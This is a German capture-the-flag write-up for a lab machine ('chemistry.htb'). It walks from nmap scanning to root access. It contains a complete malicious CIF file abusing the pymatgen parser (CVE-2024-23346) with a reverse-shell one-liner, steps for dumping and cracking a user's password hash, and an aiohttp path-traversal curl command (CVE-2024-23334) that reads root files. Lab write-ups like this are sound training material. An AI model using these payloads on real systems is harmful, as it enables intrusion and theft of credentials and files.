status: #pwnd 
level: #easy 
tags: #linux #web #LFI
tools: Pwnbox oder Kali Linux, nmap, browser, sqlite3, nc

--- 
# Ziel 
- auf Server kommen 
- user.txt finden und auslesen (immer im Home Verzeichnis von einem User auf dem System z.b /home/rosa/user.txt) 
- root.txt finden und auslesen (immer im Home Verzeichnis von Root also /root/root.txt)

# Exploits
- Webserver hat Schwachstelle bei CIF Datei verarbeitung ([CVE-2024-23346](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)) 
	- Dies kann man ausnutzen um eine Reverse Shell zu spawnen 
- Auf dem Server liegt eine Datenbank, diese enthält den Hash des Passworts von der Userin Rosa. 
	- Diesen können wir mit https://crackstation.net cracken und uns dann per SSH von unserer Maschine einloggen 
- Auf dem Server läuft ein Prozess unter dem Port 8080, dieser nutzt die Python Bibliothek **aiohttp/3.9.1** und besitzt eine Local File Inclusion (LFI) Schwachstelle ([CVE-2024-23334](https://nvd.nist.gov/vuln/detail/cve-2024-23334)) 
- Mit folgenden Befehl kann man alles auslesen (hier die root.txt die wir wollen)

```bash
curl -s --path-as-is http://localhost:8080/assets/../../../../../root/root.txt 
# -s = silent 
# --path-as-is = kein squashen von /../../../../ zu /../
```

# Ablauf

## User Flag

```bash
# das der Server auch läuft 
ping -c1 IPADRESSE 

# nmap scan welche Ports offen sind und was dahinter steckt 
nmap -sS -Pn -p- IPADRESSE 

nmap -sS -sV -sC -Pn -p22,5000 IPADRESSE 

# Ipadresse zu hosts Datei hinzufügen damit wir mit der DNS Adresse chemistry.htb auf Webseite gehen können 
echo "IPADRESSE chemistry.htb" | sudo tee -a /etc/hosts
```

Auf der Webseite findet man eine Upload Funktion für CIF Dateien
- Hier kann die erste Schwachstelle ausgenutzt werden  ([CVE-2024-23346](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f))
- Nach CIF Python Exploit googlen bringt ein paar Seiten mit möglichen Exploits hervor
	- https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
	- https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346 
- PoC (Proof of Concept) Code benutzen und anstelle von `touch pwnd` eine Reverse Shell einfügen

```bash
/bin/bash -c 'sh -i >& /dev/tcp/IPADRESSE/1337 0>&1'
```
 
 - Fertiger Exploit (vuln.cif)

```bash
data_5yOhtAoR 
_audit_creation_date 2018-06-08 
_audit_creation_method "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_ 
_parent_propagation_vector.id 
_parent_propagation_vector.kxkykz 
k1 [0 0 0] 

_space_group_magn.transform_BNS_Pp_abc 
'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ 
( 
	*[().__class__.__mro__[1]]
	+ 
	["__sub" + "classes__"]
) () 
if d.__name__ == "BuiltinImporter"] 
	[0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/PORT/1337 0>&1\'");
0,0,0' 

_space_group_magn.number_BNS 62.448 
_space_group_magn.name_BNS "P n' m a' "
```

- Netcat listener im Terminal anschmeißen

```bash
nc -lvnp 1337
```

- Exploit hochladen, ausführen wie im Writeup beschrieben und dadurch wird eine Reverse shell in unserem Terminal gespawnt
- Datenbank auslesen mit `sqlite3` und den Hashwert von rosa finden
- Hashwert von rosa mit https://crackstation.net cracken 
- In neuem Terminal per ssh und Passwort mit rosa verbinden

```bash
ssh rosa@IPADRESSE
```

- Nun können wir in rosas Home Verzeichnis die user.txt auslesen

```bash
cat user.txt
```

## Root Flag

- Port 8080 finden auf System

```bash
netstat -tulpn # oder ss -tulpn
```

- Nachschauen was darauf läuft

```bash
curl --head http://localhost:8080
```

- Wir sehen aiohttp/3.9.1 
	- diese Bibliothek hat eine Schwachstelle https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/

```bash
curl -s --path-as-is http://localhost:8080/assets/../../../../../root/root.txt 
# -s = silent 
# --path-as-is = kein squashen von /../../../../ zu /../
```

Damit haben wir beide Flagen gefunden und die Maschine durch
